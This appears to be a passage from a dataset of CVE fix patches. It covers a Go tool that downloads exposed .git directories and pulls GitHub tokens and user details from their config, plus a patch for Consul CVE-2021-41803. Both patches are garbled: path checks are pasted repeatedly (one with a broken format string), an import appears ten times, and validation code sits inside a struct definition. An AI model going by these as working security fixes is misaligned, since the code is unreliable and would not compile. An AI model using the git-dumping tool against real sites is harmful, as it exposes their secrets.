{\n+                return fmt.Errorf(\"unexpected status code for url %s : %d\", absolute.String(), resp.StatusCode)\n+        }\n+\n+        content, err := ioutil.ReadAll(resp.Body)\n+        if err != nil {\n+                return err\n+        }\n+\n+if !strings.HasPrefix(filePath, r.outputDir) {\n+return fmt.Errorf(\"path %s is outside of output directory\", filePath)\n+}\n+\n+if !strings.HasPrefix(filePath, r.outputDir) {\n+return fmt.Errorf(\"path %s is outside of output directory\", filePath)\n+}\n+\n+if !strings.HasPrefix(filePath, r.outputDir) {\n+return fmt.Errorf(\"path %%s is outside of output directory\", filePath)\n+}\n+\n+if err := os.MkdirAll(filepath.Dir(filePath), 0755); err != nil {\n+return err\n+}\n+\n+        if !strings.HasSuffix(path, \"/\") {\n+                if err := ioutil.WriteFile(filePath, content, 0640); err != nil {\n+                        return fmt.Errorf(\"failed to write %s: %w\", filePath, err)\n+                }\n+        }\n+\n+        switch path {\n+        case \"HEAD\":\n+                ref := strings.TrimPrefix(string(content), \"ref: \")\n+                if err := r.downloadFile(ref); err != nil {\n+                        return err\n+                }\n+                return nil\n+        case \"config\":\n+                return r.analyseConfig(content)\n+        case \"objects/pack/\":\n+                // parse the directory listing\n+                packFiles := packLinkRegex.FindAllStringSubmatch(string(content), -1)\n+                for _, packFile := range packFiles {\n+                        if len(packFile) <= 1 {\n+                                continue\n+                        }\n+                        if err := r.downloadFile(fmt.Sprintf(\"objects/pack/%s\", packFile[1])); err != nil {\n+                                logrus.Debugf(\"Failed to retrieve pack file %s: %s\", packFile[1], err)\n+                                continue\n+                        }\n+                }\n+                return nil\n+        case \"objects/info/packs\":\n+                return r.parsePackMetadata(content)\n+        }\n+\n+        if strings.HasSuffix(path, \".pack\") {\n+                return r.parsePackFile(path, content)\n+        }\n+\n+        if strings.HasPrefix(path, \"refs/heads/\") {\n+                if _, err := r.downloadObject(string(content)); err != nil {\n+                        return err\n+                }\n+                return nil\n+        }\n+\n+        hash := filepath.Base(filepath.Dir(path)) + filepath.Base(path)\n+\n+        objectType, err := r.getObjectType(hash)\n+        if err != nil {\n+                return err\n+        }\n+\n+        switch objectType {\n+        case GitCommitFile:\n+\n+                commit, err := r.readCommit(hash)\n+                if err != nil {\n+                        return err\n+                }\n+\n+                logrus.Debugf(\"Successfully retrieved commit %s.\", hash)\n+\n+                if commit.Tree != \"\" {\n+                        if _, err := r.downloadObject(commit.Tree); err != nil {\n+                                logrus.Debugf(\"Object %s is missing and likely packed.\", commit.Tree)\n+                        }\n+                }\n+                for _, parent := range commit.Parents {\n+                        if _, err := r.downloadObject(parent); err != nil {\n+                                logrus.Debugf(\"Object %s is missing and likely packed.\", parent)\n+                        }\n+                }\n+\n+        case GitTreeFile:\n+\n+                tree, err := r.readTree(hash)\n+                if err != nil {\n+                        return err\n+                }\n+\n+                logrus.Debugf(\"Successfully retrieved tree %s.\", hash)\n+\n+                for _, subHash := range tree.Objects {\n+                        if _, err := r.downloadObject(subHash); err != nil {\n+                                logrus.Debugf(\"Object %s is missing and likely packed.\", subHash)\n+                        }\n+                }\n+        case GitBlobFile:\n+                logrus.Debugf(\"Successfully retrieved blob %s.\", hash)\n+        default:\n+                return fmt.Errorf(\"unknown git file type for %s: %s\", path, objectType)\n+        }\n+\n+        return nil\n }\n \n func (r *retriever) downloadObject(hash string) (string, error) {\n \n-\tlogrus.Debugf(\"Requesting hash [%s]\\n\", hash)\n+        logrus.Debugf(\"Requesting hash [%s]\\n\", hash)\n \n-\tpath := fmt.Sprintf(\"objects/%s/%s\", hash[:2], hash[2:40])\n-\tif err := r.downloadFile(path); err != nil {\n-\t\tr.summary.MissingObjects = append(r.summary.MissingObjects, hash)\n-\t\treturn \"\", err\n-\t}\n-\tr.summary.FoundObjects = append(r.summary.FoundObjects, hash)\n-\treturn path, nil\n+        path := fmt.Sprintf(\"objects/%s/%s\", hash[:2], hash[2:40])\n+        if err := r.downloadFile(path); err != nil {\n+                r.summary.MissingObjects = append(r.summary.MissingObjects, hash)\n+                return \"\", err\n+        }\n+        r.summary.FoundObjects = append(r.summary.FoundObjects, hash)\n+        return path, nil\n }\n \n type GitFileType string\n \n const (\n-\tGitUnknownFile GitFileType = \"\"\n-\tGitCommitFile  GitFileType = \"commit\"\n-\tGitTreeFile    GitFileType = \"tree\"\n-\tGitBlobFile    GitFileType = \"blob\"\n+        GitUnknownFile GitFileType = \"\"\n+        GitCommitFile  GitFileType = \"commit\"\n+        GitTreeFile    GitFileType = \"tree\"\n+        GitBlobFile    GitFileType = \"blob\"\n )\n \n func (r *retriever) getObjectType(hash string) (GitFileType, error) {\n-\tcmd := exec.Command(\"git\", \"cat-file\", \"-t\", hash)\n-\tcmd.Dir = r.outputDir\n-\toutput, err := cmd.Output()\n-\tif err != nil {\n-\t\treturn GitUnknownFile, fmt.Errorf(\"failed to read type of %s: %w\", hash, err)\n-\t}\n-\treturn GitFileType(strings.TrimSpace(string(output))), nil\n+        cmd := exec.Command(\"git\", \"cat-file\", \"-t\", hash)\n+        cmd.Dir = r.outputDir\n+        output, err := cmd.Output()\n+        if err != nil {\n+                return GitUnknownFile, fmt.Errorf(\"failed to read type of %s: %w\", hash, err)\n+        }\n+        return GitFileType(strings.TrimSpace(string(output))), nil\n }\n \n type Commit struct {\n-\tTree    string\n-\tParents []string\n+        Tree    string\n+        Parents []string\n }\n \n func (r *retriever) readCommit(hash string) (*Commit, error) {\n-\tcmd := exec.Command(\"git\", \"cat-file\", \"-p\", hash)\n-\tcmd.Dir = r.outputDir\n-\toutput, err := cmd.Output()\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"failed to read commit %s: %w\", hash, err)\n-\t}\n-\n-\tlines := strings.Split(string(output), \"\\n\")\n-\tvar commit Commit\n-\tfor _, line := range lines {\n-\t\tline = strings.TrimSpace(line)\n-\t\twords := strings.Split(line, \" \")\n-\t\tif len(words) <= 1 {\n-\t\t\tcontinue\n-\t\t}\n-\t\tswitch words[0] {\n-\t\tcase \"tree\":\n-\t\t\tcommit.Tree = words[len(words)-1]\n-\t\tcase \"parent\":\n-\t\t\tcommit.Parents = append(commit.Parents, words[len(words)-1])\n-\t\t}\n-\t}\n-\treturn &commit, nil\n+        cmd := exec.Command(\"git\", \"cat-file\", \"-p\", hash)\n+        cmd.Dir = r.outputDir\n+        output, err := cmd.Output()\n+        if err != nil {\n+                return nil, fmt.Errorf(\"failed to read commit %s: %w\", hash, err)\n+        }\n+\n+        lines := strings.Split(string(output), \"\\n\")\n+        var commit Commit\n+        for _, line := range lines {\n+                line = strings.TrimSpace(line)\n+                words := strings.Split(line, \" \")\n+                if len(words) <= 1 {\n+                        continue\n+                }\n+                switch words[0] {\n+                case \"tree\":\n+                        commit.Tree = words[len(words)-1]\n+                case \"parent\":\n+                        commit.Parents = append(commit.Parents, words[len(words)-1])\n+                }\n+        }\n+        return &commit, nil\n }\n \n type Tree struct {\n-\tObjects []string\n+        Objects []string\n }\n \n func (r *retriever) readTree(hash string) (*Tree, error) {\n \n-\tcmd := exec.Command(\"git\", \"cat-file\", \"-p\", hash)\n-\tcmd.Dir = r.outputDir\n-\n-\toutput, err := cmd.Output()\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"failed to read tree %s: %w\", hash, err)\n-\t}\n-\n-\tlines := strings.Split(string(output), \"\\n\")\n-\tvar tree Tree\n-\tfor _, line := range lines {\n-\t\tline = strings.TrimSpace(line)\n-\t\tline = strings.ReplaceAll(line, \"\\t\", \" \")\n-\t\twords := strings.Split(line, \" \")\n-\t\tif len(words) < 4 {\n-\t\t\tcontinue\n-\t\t}\n-\t\ttree.Objects = append(tree.Objects, words[2])\n-\t}\n-\treturn &tree, nil\n+        cmd := exec.Command(\"git\", \"cat-file\", \"-p\", hash)\n+        cmd.Dir = r.outputDir\n+\n+        output, err := cmd.Output()\n+        if err != nil {\n+                return nil, fmt.Errorf(\"failed to read tree %s: %w\", hash, err)\n+        }\n+\n+        lines := strings.Split(string(output), \"\\n\")\n+        var tree Tree\n+        for _, line := range lines {\n+                line = strings.TrimSpace(line)\n+                line = strings.ReplaceAll(line, \"\\t\", \" \")\n+                words := strings.Split(line, \" \")\n+                if len(words) < 4 {\n+                        continue\n+                }\n+                tree.Objects = append(tree.Objects, words[2])\n+        }\n+        return &tree, nil\n }\n \n func (r *retriever) reset() error {\n \n-\tcmd := exec.Command(\"git\", \"reset\")\n-\tcmd.Dir = r.outputDir\n-\tif err := cmd.Run(); err != nil {\n-\t\treturn fmt.Errorf(\"failed to reset files: %w\", err)\n-\t}\n+        cmd := exec.Command(\"git\", \"reset\")\n+        cmd.Dir = r.outputDir\n+        if err := cmd.Run(); err != nil {\n+                return fmt.Errorf(\"failed to reset files: %w\", err)\n+        }\n \n-\treturn nil\n+        return nil\n }\n \n func (r *retriever) checkout() error {\n-\tcheckoutCmd := exec.Command(\"git\", \"checkout\", \"--\", \".\")\n-\tcheckoutCmd.Dir = r.outputDir\n-\tif err := checkoutCmd.Run(); err != nil {\n-\t\treturn fmt.Errorf(\"failed to checkout files: %w\", err)\n-\t}\n+        checkoutCmd := exec.Command(\"git\", \"checkout\", \"--\", \".\")\n+        checkoutCmd.Dir = r.outputDir\n+        if err := checkoutCmd.Run(); err != nil {\n+                return fmt.Errorf(\"failed to checkout files: %w\", err)\n+        }\n \n-\treturn nil\n+        return nil\n }\n \n var ErrNoPackInfo = fmt.Errorf(\"pack information (.git/objects/info/packs) is missing\")\n@@ -405,154 +417,154 @@ var packLinkRegex = regexp.MustCompile(\"href=[\\\"']?(pack-[a-z0-9]{40}\\\\.pack)\")\n \n func (r *retriever) locatePackFiles() error {\n \n-\t// first of all let's try a directory listing for all pack files\n-\t_ = r.downloadFile(\"objects/pack/\")\n+        // first of all let's try a directory listing for all pack files\n+        _ = r.downloadFile(\"objects/pack/\")\n \n-\t// otherwise hopefully the pak listing is available...\n-\tif err := r.downloadFile(\"objects/info/packs\"); err != nil {\n-\t\treturn ErrNoPackInfo\n-\t}\n+        // otherwise hopefully the pak listing is available...\n+        if err := r.downloadFile(\"objects/info/packs\"); err != nil {\n+                return ErrNoPackInfo\n+        }\n \n-\t// after handling pack files, let's check if anything is still missing...\n-\tvar newMissing []string\n-\tfor _, hash := range r.summary.MissingObjects {\n-\t\tpath := filepath.Join(r.outputDir, \".git\", \"objects\", hash[:2], hash[2:40])\n-\t\tif _, err := os.Stat(path); err != nil {\n-\t\t\tnewMissing = append(newMissing, hash)\n-\t\t} else {\n-\t\t\tr.summary.FoundObjects = append(r.summary.FoundObjects, hash)\n-\t\t}\n-\t}\n+        // after handling pack files, let's check if anything is still missing...\n+        var newMissing []string\n+        for _, hash := range r.summary.MissingObjects {\n+                path := filepath.Join(r.outputDir, \".git\", \"objects\", hash[:2], hash[2:40])\n+                if _, err := os.Stat(path); err != nil {\n+                        newMissing = append(newMissing, hash)\n+                } else {\n+                        r.summary.FoundObjects = append(r.summary.FoundObjects, hash)\n+                }\n+        }\n \n-\tr.summary.MissingObjects = newMissing\n+        r.summary.MissingObjects = newMissing\n \n-\treturn nil\n+        return nil\n }\n \n func (r *retriever) Run() (*Summary, error) {\n \n-\tif err := r.checkVulnerable(); err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tif err := r.downloadFile(\"config\"); err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tif err := r.downloadFile(\"HEAD\"); err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\t// common paths to check, not necessarily required\n-\tfor _, path := range paths {\n-\t\t_ = r.downloadFile(path)\n-\t}\n-\n-\t// grab packed files\n-\tif err := r.locatePackFiles(); err == ErrNoPackInfo {\n-\t\tr.summary.PackInformationAvailable = false\n-\t\tlogrus.Debugf(\"Pack information file is not available - some objects may be missing.\")\n-\t} else if err == nil {\n-\t\tr.summary.PackInformationAvailable = true\n-\t} else { // if there's a different error, ignore it, we can continue without unpacking\n-\t\tr.summary.PackInformationAvailable = true\n-\t\tlogrus.Debugf(\"Error in unpack operation: %s\", err)\n-\t}\n-\tif len(r.summary.FoundObjects) == 0 {\n-\t\tr.summary.Status = StatusFailure\n-\t} else if len(r.summary.MissingObjects) > 0 {\n-\t\tr.summary.Status = StatusPartialSuccess\n-\t} else {\n-\t\tr.summary.Status = StatusSuccess\n-\t}\n-\n-\tif err := r.reset(); err != nil {\n-\t\tif r.summary.Status > StatusPartialSuccess {\n-\t\t\tr.summary.Status = StatusPartialSuccess\n-\t\t}\n-\t\tlogrus.Debugf(\"Failed to reset: %s\", err)\n-\t} else if err := r.checkout(); err != nil {\n-\t\tif r.summary.Status > StatusPartialSuccess {\n-\t\t\tr.summary.Status = StatusPartialSuccess\n-\t\t}\n-\t\tlogrus.Debugf(\"Failed to checkout: %s\", err)\n-\t}\n-\n-\treturn &r.summary, nil\n+        if err := r.checkVulnerable(); err != nil {\n+                return nil, err\n+        }\n+\n+        if err := r.downloadFile(\"config\"); err != nil {\n+                return nil, err\n+        }\n+\n+        if err := r.downloadFile(\"HEAD\"); err != nil {\n+                return nil, err\n+        }\n+\n+        // common paths to check, not necessarily required\n+        for _, path := range paths {\n+                _ = r.downloadFile(path)\n+        }\n+\n+        // grab packed files\n+        if err := r.locatePackFiles(); err == ErrNoPackInfo {\n+                r.summary.PackInformationAvailable = false\n+                logrus.Debugf(\"Pack information file is not available - some objects may be missing.\")\n+        } else if err == nil {\n+                r.summary.PackInformationAvailable = true\n+        } else { // if there's a different error, ignore it, we can continue without unpacking\n+                r.summary.PackInformationAvailable = true\n+                logrus.Debugf(\"Error in unpack operation: %s\", err)\n+        }\n+        if len(r.summary.FoundObjects) == 0 {\n+                r.summary.Status = StatusFailure\n+        } else if len(r.summary.MissingObjects) > 0 {\n+                r.summary.Status = StatusPartialSuccess\n+        } else {\n+                r.summary.Status = StatusSuccess\n+        }\n+\n+        if err := r.reset(); err != nil {\n+                if r.summary.Status > StatusPartialSuccess {\n+                        r.summary.Status = StatusPartialSuccess\n+                }\n+                logrus.Debugf(\"Failed to reset: %s\", err)\n+        } else if err := r.checkout(); err != nil {\n+                if r.summary.Status > StatusPartialSuccess {\n+                        r.summary.Status = StatusPartialSuccess\n+                }\n+                logrus.Debugf(\"Failed to checkout: %s\", err)\n+        }\n+\n+        return &r.summary, nil\n }\n \n func (r *retriever) analyseConfig(content []byte) error {\n-\tlines := strings.Split(string(content), \"\\n\")\n-\tvar section string\n-\tfor _, line := range lines {\n-\t\tline = strings.TrimSpace(line)\n-\t\tif strings.HasPrefix(line, \"[\") {\n-\t\t\tline = line[1:]\n-\t\t\tline = line[0 : len(line)-1]\n-\t\t\targs := strings.Split(line, \" \")\n-\t\t\tsection = args[0]\n-\t\t\tswitch section {\n-\t\t\tcase \"remote\":\n-\t\t\t\tname := \"?\"\n-\t\t\t\tif len(args) > 1 {\n-\t\t\t\t\tname = strings.TrimSuffix(args[1][1:], \"\\\"\")\n-\t\t\t\t}\n-\t\t\t\tr.summary.Config.Remotes = append(r.summary.Config.Remotes, Remote{\n-\t\t\t\t\tName: name,\n-\t\t\t\t})\n-\t\t\tcase \"branch\":\n-\t\t\t\tname := \"?\"\n-\t\t\t\tif len(args) > 1 {\n-\t\t\t\t\tname = strings.TrimSuffix(args[1][1:], \"\\\"\")\n-\t\t\t\t}\n-\t\t\t\tr.summary.Config.Branches = append(r.summary.Config.Branches, Branch{\n-\t\t\t\t\tName: name,\n-\t\t\t\t})\n-\t\t\t}\n-\t\t\tcontinue\n-\t\t}\n-\n-\t\tparts := strings.Split(line, \"=\")\n-\t\tif len(parts) <= 1 {\n-\t\t\tcontinue\n-\t\t}\n-\n-\t\tkey := strings.TrimSpace(parts[0])\n-\t\tval := strings.TrimSpace(strings.Join(parts[1:], \"=\"))\n-\n-\t\tswitch section {\n-\t\tcase \"remote\":\n-\t\t\tswitch key {\n-\t\t\tcase \"url\":\n-\t\t\t\tr.summary.Config.Remotes[len(r.summary.Config.Remotes)-1].URL = val\n-\t\t\t\tif strings.Contains(val, \"/\") {\n-\t\t\t\t\tname := val[strings.Index(val, \"/\")+1:]\n-\t\t\t\t\tr.summary.Config.RepositoryName = strings.TrimSuffix(name, \".git\")\n-\t\t\t\t}\n-\t\t\t}\n-\t\tcase \"branch\":\n-\t\t\tswitch key {\n-\t\t\tcase \"remote\":\n-\t\t\t\tr.summary.Config.Branches[len(r.summary.Config.Branches)-1].Remote = val\n-\t\t\t}\n-\t\tcase \"user\":\n-\t\t\tswitch key {\n-\t\t\tcase \"name\":\n-\t\t\t\tr.summary.Config.User.Name = val\n-\t\t\tcase \"username\":\n-\t\t\t\tr.summary.Config.User.Username = val\n-\t\t\tcase \"email\":\n-\t\t\t\tr.summary.Config.User.Email = val\n-\t\t\t}\n-\t\tcase \"github\":\n-\t\t\tswitch key {\n-\t\t\tcase \"user\":\n-\t\t\t\tr.summary.Config.GithubToken.Username = val\n-\t\t\tcase \"token\":\n-\t\t\t\tr.summary.Config.GithubToken.Token = val\n-\t\t\t}\n-\t\t}\n-\n-\t}\n-\treturn nil\n+        lines := strings.Split(string(content), \"\\n\")\n+        var section string\n+        for _, line := range lines {\n+                line = strings.TrimSpace(line)\n+                if strings.HasPrefix(line, \"[\") {\n+                        line = line[1:]\n+                        line = line[0 : len(line)-1]\n+                        args := strings.Split(line, \" \")\n+                        section = args[0]\n+                        switch section {\n+                        case \"remote\":\n+                                name := \"?\"\n+                                if len(args) > 1 {\n+                                        name = strings.TrimSuffix(args[1][1:], \"\\\"\")\n+                                }\n+                                r.summary.Config.Remotes = append(r.summary.Config.Remotes, Remote{\n+                                        Name: name,\n+                                })\n+                        case \"branch\":\n+                                name := \"?\"\n+                                if len(args) > 1 {\n+                                        name = strings.TrimSuffix(args[1][1:], \"\\\"\")\n+                                }\n+                                r.summary.Config.Branches = append(r.summary.Config.Branches, Branch{\n+                                        Name: name,\n+                                })\n+                        }\n+                        continue\n+                }\n+\n+                parts := strings.Split(line, \"=\")\n+                if len(parts) <= 1 {\n+                        continue\n+                }\n+\n+                key := strings.TrimSpace(parts[0])\n+                val := strings.TrimSpace(strings.Join(parts[1:], \"=\"))\n+\n+                switch section {\n+                case \"remote\":\n+                        switch key {\n+                        case \"url\":\n+                                r.summary.Config.Remotes[len(r.summary.Config.Remotes)-1].URL = val\n+                                if strings.Contains(val, \"/\") {\n+                                        name := val[strings.Index(val, \"/\")+1:]\n+                                        r.summary.Config.RepositoryName = strings.TrimSuffix(name, \".git\")\n+                                }\n+                        }\n+                case \"branch\":\n+                        switch key {\n+                        case \"remote\":\n+                                r.summary.Config.Branches[len(r.summary.Config.Branches)-1].Remote = val\n+                        }\n+                case \"user\":\n+                        switch key {\n+                        case \"name\":\n+                                r.summary.Config.User.Name = val\n+                        case \"username\":\n+                                r.summary.Config.User.Username = val\n+                        case \"email\":\n+                                r.summary.Config.User.Email = val\n+                        }\n+                case \"github\":\n+                        switch key {\n+                        case \"user\":\n+                                r.summary.Config.GithubToken.Username = val\n+                        case \"token\":\n+                                r.summary.Config.GithubToken.Token = val\n+                        }\n+                }\n+\n+        }\n+        return nil\n }\n"}
{"cve":"CVE-2021-41803:0708", "fix_patch": "diff --git a/agent/consul/auto_config_endpoint.go b/agent/consul/auto_config_endpoint.go\nindex 088c9a3e0d..8a2a23e3ee 100644\n--- a/agent/consul/auto_config_endpoint.go\n+++ b/agent/consul/auto_config_endpoint.go\n@@ -1,150 +1,208 @@\n package consul\n \n import (\n-\t\"context\"\n-\t\"crypto/x509\"\n-\t\"encoding/base64\"\n-\t\"fmt\"\n-\n-\t\"github.com/hashicorp/consul/acl\"\n-\n-\tbexpr \"github.com/hashicorp/go-bexpr\"\n-\n-\t\"github.com/hashicorp/consul/agent/connect\"\n-\t\"github.com/hashicorp/consul/agent/consul/authmethod/ssoauth\"\n-\t\"github.com/hashicorp/consul/agent/structs\"\n-\t\"github.com/hashicorp/consul/lib/template\"\n-\t\"github.com/hashicorp/consul/proto/pbautoconf\"\n-\t\"github.com/hashicorp/consul/proto/pbconfig\"\n-\t\"github.com/hashicorp/consul/proto/pbconnect\"\n-\t\"github.com/hashicorp/consul/tlsutil\"\n+        \"context\"\n+        \"crypto/x509\"\n+        \"encoding/base64\"\n+        \"fmt\"\n+\n+        \"github.com/hashicorp/consul/acl\"\n+\n+        bexpr \"github.com/hashicorp/go-bexpr\"\n+\n+        \"github.com/hashicorp/consul/agent/connect\"\n+        \"github.com/hashicorp/consul/agent/consul/authmethod/ssoauth\"\n+\"github.com/hashicorp/consul/agent/dns\"\n+\"github.com/hashicorp/consul/agent/dns\"\n+\"github.com/hashicorp/consul/agent/dns\"\n+\"github.com/hashicorp/consul/agent/dns\"\n+\"github.com/hashicorp/consul/agent/dns\"\n+\"github.com/hashicorp/consul/agent/dns\"\n+\"github.com/hashicorp/consul/agent/dns\"\n+\"github.com/hashicorp/consul/agent/dns\"\n+\"github.com/hashicorp/consul/agent/dns\"\n+\"github.com/hashicorp/consul/agent/dns\"\n+        \"github.com/hashicorp/consul/agent/structs\"\n+        \"github.com/hashicorp/consul/lib/template\"\n+        \"github.com/hashicorp/consul/proto/pbautoconf\"\n+        \"github.com/hashicorp/consul/proto/pbconfig\"\n+        \"github.com/hashicorp/consul/proto/pbconnect\"\n+        \"github.com/hashicorp/consul/tlsutil\"\n )\n \n type AutoConfigOptions struct {\n-\tNodeName    string\n-\tSegmentName string\n-\tPartition   string\n+        NodeName    string\n+        SegmentName string\n+        Partition   string\n \n-\tCSR      *x509.CertificateRequest\n-\tSpiffeID *connect.SpiffeIDAgent\n+        CSR      *x509.CertificateRequest\n+        SpiffeID *connect.SpiffeIDAgent\n }\n \n func (opts AutoConfigOptions) PartitionOrDefault() string {\n-\treturn acl.PartitionOrDefault(opts.Partition)\n+        return acl.PartitionOrDefault(opts.Partition)\n }\n \n type AutoConfigAuthorizer interface {\n-\t// Authorizes the request and returns a struct containing the various\n-\t// options for how to generate the configuration.\n-\tAuthorize(*pbautoconf.AutoConfigRequest) (AutoConfigOptions, error)\n+        // Authorizes the request and returns a struct containing the various\n+        // options for how to generate the configuration.\n+        Authorize(*pbautoconf.AutoConfigRequest) (AutoConfigOptions, error)\n }\n \n type disabledAuthorizer struct{}\n \n func (_ *disabledAuthorizer) Authorize(_ *pbautoconf.AutoConfigRequest) (AutoConfigOptions, error) {\n-\treturn AutoConfigOptions{}, fmt.Errorf(\"Auto Config is disabled\")\n+        return AutoConfigOptions{}, fmt.Errorf(\"Auto Config is disabled\")\n }\n \n type jwtAuthorizer struct {\n-\tvalidator       *ssoauth.Validator\n-\tallowReuse      bool\n-\tclaimAssertions []string\n+        validator       *ssoauth.Validator\n+        allowReuse      bool\n+        claimAssertions []string\n+if err := dns.ValidateLabel(req.Node); err != nil {\n+return AutoConfigOptions{}, fmt.Errorf(\"node name %q is not valid: %w\", req.Node, err)\n+}\n+if req.Segment != \"\" {\n+if err := dns.ValidateLabel(req.Segment); err != nil {\n+return AutoConfigOptions{}, fmt.Errorf(\"segment name %q is not valid: %w\", req.Segment, err)\n+}\n+}\n }\n \n func (a *jwtAuthorizer) Authorize(req *pbautoconf.AutoConfigRequest) (AutoConfigOptions, error) {\n-\t// perform basic JWT Authorization\n-\tidentity, err := a.validator.ValidateLogin(context.Background(), req.JWT)\n-\tif err != nil {\n-\t\t// TODO (autoconf) maybe we should add a more generic permission denied error not tied to the ACL package?\n-\t\treturn AutoConfigOptions{}, acl.PermissionDenied(\"Failed JWT authorization: %v\", err)\n-\t}\n-\n-\tvarMap := map[string]string{\n-\t\t\"node\":      req.Node,\n-\t\t\"segment\":   req.Segment,\n-\t\t\"partition\": req.PartitionOrDefault(),\n-\t}\n-\n-\tfor _, raw := range a.claimAssertions {\n-\t\t// validate and fill any HIL\n-\t\tfilled, err := template.InterpolateHIL(raw, varMap, true)\n-\t\tif err != nil {\n-\t\t\treturn AutoConfigOptions{}, fmt.Errorf(\"Failed to render claim assertion template %q: %w\", raw, err)\n-\t\t}\n-\n-\t\tevaluator, err := bexpr.CreateEvaluatorForType(filled, nil, identity.SelectableFields)\n-\t\tif err != nil {\n-\t\t\treturn AutoConfigOptions{}, fmt.Errorf(\"Failed to create evaluator for claim assertion %q: %w\", filled, err)\n-\t\t}\n-\n-\t\tok, err := evaluator.Evaluate(identity.SelectableFields)\n-\t\tif err != nil {\n-\t\t\treturn AutoConfigOptions{}, fmt.Errorf(\"Failed to execute claim assertion %q: %w\", filled, err)\n-\t\t}\n-\n-\t\tif !ok {\n-\t\t\treturn AutoConfigOptions{}, acl.PermissionDenied(\"Failed JWT claim assertion\")\n-\t\t}\n-\t}\n-\n-\topts := AutoConfigOptions{\n-\t\tNodeName:    req.Node,\n-\t\tSegmentName: req.Segment,\n-\t\tPartition:   req.Partition,\n-\t}\n-\n-\tif req.CSR != \"\" {\n-\t\tcsr, id, err := parseAutoConfigCSR(req.CSR)\n-\t\tif err != nil {\n-\t\t\treturn AutoConfigOptions{}, err\n-\t\t}\n-\n-\t\tif id.Agent != req.Node || !acl.EqualPartitions(id.Partition, req.Partition) {\n-\t\t\treturn AutoConfigOptions{},\n-\t\t\t\tfmt.Errorf(\"Spiffe ID agent name (%s) of the certificate signing request is not for the correct node (%s)\",\n-\t\t\t\t\tprintNodeName(id.Agent, id.Partition),\n-\t\t\t\t\tprintNodeName(req.Node, req.Partition),\n-\t\t\t\t)\n-\t\t}\n-\n-\t\topts.CSR = csr\n-\t\topts.SpiffeID = id\n-\t}\n-\n-\treturn opts, nil\n+        // perform basic JWT Authorization\n+        identity, err := a.validator.ValidateLogin(context.Background(), req.JWT)\n+if err := dns.ValidateLabel(req.Node); err != nil {\n+return AutoConfigOptions{}, fmt.Errorf(\"node name %q is not valid: %w\", req.Node, err)\n+}\n+if req.Segment != \"\" {\n+if err := dns.ValidateLabel(req.Segment); err != nil {\n+return AutoConfigOptions{}, fmt.Errorf(\"segment name %q is not valid: %w\", req.Segment, err)\n+}\n+}\n+        if err != nil {\n+                // TODO (autoconf) maybe we should add a more generic permission denied error not tied to the ACL package?\n+if err := dns.ValidateLabel(req.Node); err != nil {\n+return AutoConfigOptions{}, fmt.Errorf(\"node name %q is not valid: %w\", req.Node, err)\n+}\n+if req.Segment != \"\" {\n+if err := dns.ValidateLabel(req.Segment); err != nil {\n+return AutoConfigOptions{}, fmt.Errorf(\"segment name %q is not valid: %w\", req.Segment, err)\n+}\n+}\n+if err := dns.ValidateLabel(req.Node); err != nil {\n+return AutoConfigOptions{}, fmt.Errorf(\"node name %q is not valid: %w\", req.Node, err)\n+}\n+if req.Segment != \"\" {\n+if err := dns.ValidateLabel(req.Segment); err != nil {\n+return AutoConfigOptions{}, fmt.Errorf(\"segment name %q is not valid: %w\", req.Segment, err)\n+}\n+}\n+if err := dns.ValidateLabel(req.Node); err != nil {\n+return AutoConfigOptions{}, fmt.Errorf(\"node name %q is not valid: %w\", req.Node, err)\n+}\n+if req.Segment != \"\" {\n+if err := dns.ValidateLabel(req.Segment); err != nil {\n+return AutoConfigOptions{}, fmt.Errorf(\"segment name %q is not valid: %w\", req.Segment, err)\n+}\n+}\n+                return AutoConfigOptions{}, acl.PermissionDenied(\"Failed JWT authorization: %v\", err)\n+        }\n+\n+if err := dns.ValidateLabel(req.Node); err != nil {\n+return AutoConfigOptions{}, fmt.Errorf(\"node name %q is not valid: %w\", req.Node, err)\n+}\n+if req.Segment != \"\" {\n+if err := dns.ValidateLabel(req.Segment); err != nil {\n+return AutoConfigOptions{}, fmt.Errorf(\"segment name %q is not valid: %w\", req.Segment, err)\n+}\n+}\n+        varMap := map[string]string{\n+                \"node\":      req.Node,\n+                \"segment\":   req.Segment,\n+                \"partition\": req.PartitionOrDefault(),\n+        }\n+\n+        for _, raw := range a.claimAssertions {\n+                // validate and fill any HIL\n+                filled, err := template.InterpolateHIL(raw, varMap, true)\n+                if err != nil {\n+                        return AutoConfigOptions{}, fmt.Errorf(\"Failed to render claim assertion template %q: %w\", raw, err)\n+                }\n+\n+                evaluator, err := bexpr.CreateEvaluatorForType(filled, nil, identity.SelectableFields)\n+                if err != nil {\n+                        return AutoConfigOptions{}, fmt.Errorf(\"Failed to create evaluator for claim assertion %q: %w\", filled, err)\n+                }\n+\n+                ok, err := evaluator.Evaluate(identity.SelectableFields)\n+                if err != nil {\n+                        return AutoConfigOptions{}, fmt.Errorf(\"Failed to execute claim assertion %q: %w\", filled, err)\n+                }\n+\n+                if !ok {\n+                        return AutoConfigOptions{}, acl.PermissionDenied(\"Failed JWT claim assertion\")\n+                }\n+        }\n+\n+        opts := AutoConfigOptions{\n+                NodeName:    req.Node,\n+                SegmentName: req.Segment,\n+                Partition:   req.Partition,\n+        }\n+\n+        if req.CSR != \"\" {\n+                csr, id, err := parseAutoConfigCSR(req.CSR)\n+                if err != nil {\n+                        return AutoConfigOptions{}, err\n+                }\n+\n+                if id.Agent != req.Node || !acl.EqualPartitions(id.Partition, req.Partition) {\n+                        return AutoConfigOptions{},\n+                                fmt.Errorf(\"Spiffe ID agent name (%s) of the certificate signing request is not for the correct node (%s)\",\n+                                        printNodeName(id.Agent, id.Partition),\n+                                        printNodeName(req.Node, req.Partition),\n+                                )\n+                }\n+\n+                opts.CSR = csr\n+                opts.SpiffeID = id\n+        }\n+\n+        return opts, nil\n }\n \n type AutoConfigBackend interface {\n-\tCreateACLToken(template *structs.ACLToken) (*structs.ACLToken, error)\n-\tDatacenterJoinAddresses(partition, segment string) ([]string, error)\n-\tForwardRPC(method string, info structs.RPCInfo, reply interface{}) (bool, error)\n-\tGetCARoots() (*structs.IndexedCARoots, error)\n-\tSignCertificate(csr *x509.CertificateRequest, id connect.CertURI) (*structs.IssuedCert, error)\n+        CreateACLToken(template *structs.ACLToken) (*structs.ACLToken, error)\n+        